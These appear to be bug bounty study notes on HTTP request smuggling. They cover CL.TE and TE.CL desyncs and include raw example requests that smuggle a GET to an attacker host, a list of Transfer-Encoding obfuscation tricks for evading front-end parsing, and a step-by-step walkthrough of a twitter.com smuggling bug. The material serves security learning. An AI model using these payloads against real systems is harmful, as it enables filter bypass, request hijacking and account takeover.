



---look for methodology


https://freedium.cfd/https://medium.com/@bugbounty_learners/today-how-to-get-500-bounty-on-hackerone-p3-345fa44f76a3


---
# HTTP Request Smuggling — Basics & Types:

#### **Understanding Words**

- [HTTP/2 & HTTP/1.1](https://www.digitalocean.com/community/tutorials/http-1-1-vs-http-2-what-s-the-difference "None")
- [Content-Length](https://reqbin.com/req/b3tqmhxa/post-request-with-content-length-header "None")
- [Transfer-Encoding](https://http.dev/transfer-encoding "None")

### **Basic of Vulnerability**

Most HTTP request smuggling vulnerabilities arise because the **HTTP/1** specification provides two different ways to specify where a request ends: the **Content-Length header** and the **Transfer-Encoding** header.

You need this two thoughts only

- First change the **HTTP/2** to **HTTP/1.1**
- Modify or rearrangeing **Content-Length** & **Transfer-Encoding**

### Lets start the game

First I discuss mostly vulnerable **CL.TE** type.

#### What is the CL.TE ?

Explanation of CL.TE **→ Content-Length.Transfer-Encoding**

- Front-end server :- **Content-Length**
- Back-end server :- **Transfer-Encoding**

![None](https://miro.medium.com/v2/resize:fit:700/1*0UxRriQCHdJH8Ip8YMU8ig.png)

						Example request:


```http
POST /api/sessions HTTP/1.1
Host: console.target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
DNT: 1
Connection: close
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
Transfer-Encoding: chunked

39
{"session":{"email":"fdsfsd@fgd.jk","password":"sdfsdf"}}
00

GET / HTTP/1.1
Host: www.attacker.com
foo: x
```


**Bypass Tips for CL.TE**

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked


X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked

```


_#type -2_

Second type is completely opposite of CL.TE if you understand the first type easily understand the **TE.CL**

#### **What is the TE.CL ?**

- **Front-end** server :- Transfer-Encoding
- **Back-end** server :- Content-Length

![None](https://miro.medium.com/v2/resize:fit:700/1*mA8iSSATzYlej-AXauQUaQ.png)

								Example request:


```http
POST /api/sessions HTTP/1.1
Host: console.target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
DNT: 1
Connection: close
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
Transfer-Encoding: chunked

8
GET / HTTP/1.1
Host: www.attacker.com
foo: x
0

```

#### Impact

- Bypassing Security Filters
- Credentials Hijacking
- Replacement of Regular Response

---

##  Bounty $3000 http request smuggling in twitter.com

![[Pasted image 20250125235859.png]]

change request from GET to POST:


![[Pasted image 20250126000205.png]]

remove the encoding header and the connection header, and add the ***Transfer Encoding: chunked*** header at the end of the request:


![[Pasted image 20250126000359.png]]

(in this case we get an invalid response, but if we add a zero at the end of the response)

![[Pasted image 20250126000732.png]]

Now we will make a request with  twitter req.

intercept:

![[Pasted image 20250126001500.png]]


send to repeater:

![[Pasted image 20250126001542.png]]

Copy the full request and then return to the request you made before, and put the request after the '0':

![[Pasted image 20250126001630.png]]


now we simply delete the url encrypted message "hi this poc 1"  and add a plus '+' in between the spaces:

![[Pasted image 20250126001736.png]]


output message:  (this is just text, not malicious javascript)


![[Pasted image 20250126002506.png]]


**what is the potential impact of this vuln :** an attacker can inject a malicious HTTP request into the web server in order to bypass internal security controls. The point is that, most of the time, the web servers do not check for security mesures in a smuggled http request. In addition, some of the ressources available on the web server are often not accessible outsite of the web server itself. So performing a request like this can allow the attacker to ~={cyan}gain access to protected ressources such as admin panel etc...=~

---

<iframe width="1013" height="570" src="https://www.youtube.com/embed/gzM4wWA7RFo" title="$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>